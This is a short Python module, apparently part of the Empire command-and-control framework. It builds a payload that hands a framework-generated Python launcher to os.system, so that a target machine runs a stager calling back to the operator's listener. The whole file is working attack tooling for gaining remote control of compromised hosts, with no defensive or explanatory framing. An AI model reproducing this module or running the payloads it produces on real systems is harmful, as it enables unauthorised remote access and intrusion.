from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule
from empire.server.utils.module_util import handle_error_message


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        # extract all of our options
        listener_name = params["Listener"]
        user_agent = params["UserAgent"]

        # generate the launcher code
        launcher = main_menu.stagergenv2.generate_launcher(
            listener_name, language="python", user_agent=user_agent
        )

        if launcher == "":
            return handle_error_message("[!] Error in launcher command generation.")

        launcher = launcher.replace('"', '\\"')
        return f'import os; os.system("{launcher}")'
